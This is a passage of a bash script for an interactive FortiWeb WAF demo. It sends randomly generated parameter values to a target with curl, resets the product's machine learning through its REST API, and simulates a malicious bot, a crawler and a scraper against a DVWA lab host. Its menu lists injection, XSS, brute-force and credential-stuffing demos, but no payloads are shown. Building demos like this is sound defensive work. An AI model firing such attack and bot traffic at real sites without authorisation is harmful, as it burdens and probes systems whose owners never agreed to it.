        PARAMETERVALUE=$USER_NAME@$DOMAIN_NAME.$DOMAIN_EXT
        elif [ $PARAMETERTYPE = "phone" ]
        then
        COUNTRYCODE=`shuf -i 1-99 -n 1`
        AREAPHONE=`shuf -i 100000000-999999999 -n 1`
        PARAMETERVALUE="%2B$COUNTRYCODE-$AREAPHONE"
        elif [ $PARAMETERTYPE = "random" ]
        then
        RANDOM_LENGTH=15
        PARAMETERVALUE="$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $RANDOM_LENGTH | head -n 1| sed s/[\?\&]//g)"
        elif [ $PARAMETERTYPE = "number-small" ]
        then
        PARAMETERVALUE=`shuf -i 0-100 -n 1`
        elif [ $PARAMETERTYPE = "number-big" ]
        then
        PARAMETERVALUE=`shuf -i 1000-10000000 -n 1`
        else
        echo -en "${RED_BOLD}ERROR: No valid data type.\n${RESTORE}Press enter to continue... "
        read response
        return 1
        fi

        [ ${DEBUG} == "enable" ] && echo "Method="${METHOD} "URL="${URL} "Parameter="${PARAMETER} "Value="${PARAMETERVALUE}

        [ $METHOD == GET ]  && ( WEBPARAMETERVALUE=`echo $PARAMETERVALUE | sed s/\ /%20/g` ; curl -k -A ML-tester -s "$URL?$PARAMETER=$WEBPARAMETERVALUE" -o /dev/null)
        [ $METHOD == POST ]  && curl -k -A ML-tester -s -X $METHOD $URL -d "$PARAMETER=$PARAMETERVALUE" -o /dev/null
        [ $METHOD == PUT ]  && curl -k -A ML-tester -s -X $METHOD $URL -d "$PARAMETER=$PARAMETERVALUE" -o /dev/null
        [ $METHOD == DELETE ]  && curl -k -A ML-tester -s -X $METHOD $URL -d "$PARAMETER=$PARAMETERVALUE" -o /dev/null
        [ $METHOD == OPTIONS ]  && curl -k -A ML-tester -s -X $METHOD $URL -d "$PARAMETER=$PARAMETERVALUE" -o /dev/null
        [ $METHOD == HEAD ]  && curl -k -A ML-tester -s -X $METHOD $URL -o /dev/null
        sleep 0.02
        let "COUNTER += 1"  # Increment count.
        printprogress $COUNTER
    done
    
    echo ""
    echo ""
    echo -en "${RESTORE}Press enter to continue... "
    read response
    return 1
}

############################################################################
## REST API
############################################################################
API_Create_Policy() {
    dos2unix -q api-create-policy.sh
	. "api-create-policy.sh"
    echo -n "Press enter to continue... "
    read response
    return 1
}

API_Delete_Policy() {
    dos2unix -q api-delete-policy.sh
	. "api-delete-policy.sh"
    echo -n "Press enter to continue... "
    read response
    return 1
}

API_Reset_ML() {

    echo ""
    echo "Getting ML Domain Info:"
    echo ""

    result=$(curl --silent --insecure --location -g --request GET "https://${FWB_MGT_IP}/api/v2.0/machine_learning/policy.getdomaininfo?policy_name=${POLICY}" \
    --header "Authorization: ${TOKEN}" \
    --header 'accept: application/json' | jq)

    echo -e "${GREEN_BOLD}${result}${RESTORE}"
    echo ""

    # Get the db_id value
    db_id=$(echo "$result" | jq '.results[0].db_id')
    domain_name=$(echo "$result" | jq '.results[0].domain_name')

    echo "Domain ${domain_name} has db_id ${db_id}"
    echo ""

    # Execute the command with the extracted db_id value
    echo "Resetting Machine Learning for Domain ${domain_name}"
    echo ""

    curl --insecure --location -g --request POST "https://${FWB_MGT_IP}/api/v2.0/machine_learning/policy.refreshdomain" \
    --header "Authorization: ${TOKEN}" \
    --header 'accept: application/json' \
    --data-raw '{"domain_id": "'${db_id}'", "policy_name": "'${POLICY}'"}'

    echo ""
    echo ""
    echo -en "${YELLOW_BOLD}Machine Learning for domain ${domain_name} has been reset${RESTORE}. Press enter to continue... "
    read response
    return 1
}


############################################################################
## Bot Actions
############################################################################

BOT_Deception() {
    echo ""
    echo "Bot Deception"
    echo ""
    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php\n${YELLOW_BOLD}"
    curl -s -k "${DVWA_URL}/login.php" \
        -H "authority: ${DVWA_HOST}" \
        -H "cache-control: max-age=0" \
        -H "content-type: application/x-www-form-urlencoded" \
        -H "origin: ${DVWA_URL}" \
        -H "referer: ${DVWA_URL}" \
        -H "user-agent: FortiWeb Demo Script" | grep 'display:none'
    echo ""
    echo -e "${RESTORE}We can see a hidden link on the login page (display:none)."
    echo ""
    echo -en "Let's simulate a malicious bot and follow that link. Press enter to continue... "
    read response
    echo ""
    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/fake_url.php\n${RED_BOLD}"
    curl -s -k "${DVWA_URL}/fake_url.php" \
        -H "authority: ${DVWA_HOST}" \
        -H "cache-control: max-age=0" \
        -H "content-type: application/x-www-form-urlencoded" \
        -H "origin: ${DVWA_URL}" \
        -H "referer: ${DVWA_URL}/index.php" \
        -H "user-agent: FortiWeb Demo Script" | grep -oP '(?<=<h3>).*?(?=</h3>)'
    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

BOT_Web_Crawler() {
    echo "Web Crawler Started (WotBox)"
    httrack ${DVWA_HOST} -O ./dvwa_dump --testlinks -%v -F "wotbox"
    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

BOT_Web_Scraper() {
    rm -f output.txt
    echo ""
    echo "Web Scraper Started"
    python3 "$(dirname "$0")/scrape_products.py" 
    echo ""
    more -e output.txt
    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

############################################################################
## Exit Program
############################################################################

Exit() {
    return 0
}


################################
## Menu
################################

## Menu Item Text
menuItems=(
    "A. Vulnerability Scanner"
    "B. Command Injection (Pablo)"
    "C. SQL Injection (Gordon)"
    "D. Cookie Security (Smith)"
    "E. Credential Stuffing Defense (pklangdon4@msn.com)"
    "F. Brute Force Attack"
    "G. ML - 3000 POST requests - normal field input (learn)"
    "H. ML - 3000 POST requests - random field input (relearn)"
    "I. ML - Cross-site scripting"
    "J. ML - SQL Injection"
    "K. ML - Zero-Day Command Injection"
    "L. ML - Zero-Day SQL Injection"
    "M. ML - Custom Request"
    "N. REST API - Create POLICY1 & POLICY2"
    "O. REST API - Delete POLICY1 & POLICY2"
    "P. REST API - Reset Machine Learning"
    "Q. Bot - Bot Deception"
    "R. Bot - Web Crawler (Known Bots Detection)"
    "S. Bot - Web Scraper (Machine Learning)"
)

## Menu Item Actions
menuActions=(
    Vulnerability_Scanner
    Command_Injection
    SQL_Injection
    Cookie_Security
    Credential_Stuffing
    Brute_Force_Attack
    ML_Learn_Parameters
    ML_Relearn_Parameters
    ML_Exploit_XSS
    ML_Exploit_SQLi
    ML_Exploit_ZeroDay_CMDi
    ML_Exploit_ZeroDay_SQLi
    ML_Custom_Request
    API_Create_Policy
    API_Delete_Policy
    API_Reset_ML
    BOT_Deception
    BOT_Web_Crawler
    BOT_Web_Scraper    
)

################################
## Menu Display
################################
menuTitle=" FortiWeb Demo - Last Update May 17th, 2023"
menuFooter="Navigate via Up/Down/Letter, Enter to Select"
menuWidth=90
menuLeft=15
menuHighlight=$DRAW_COL_YELLOW

# DRAW_COL_DEF
# DRAW_COL_BLACK
# DRAW_COL_WHITE
# DRAW_COL_RED
# DRAW_COL_GREEN
# DRAW_COL_YELLOW
# DRAW_COL_BLUE
# DRAW_COL_GRAY


################################
## Run Menu
################################
initAll
menuInit
menuLoop

exit 0
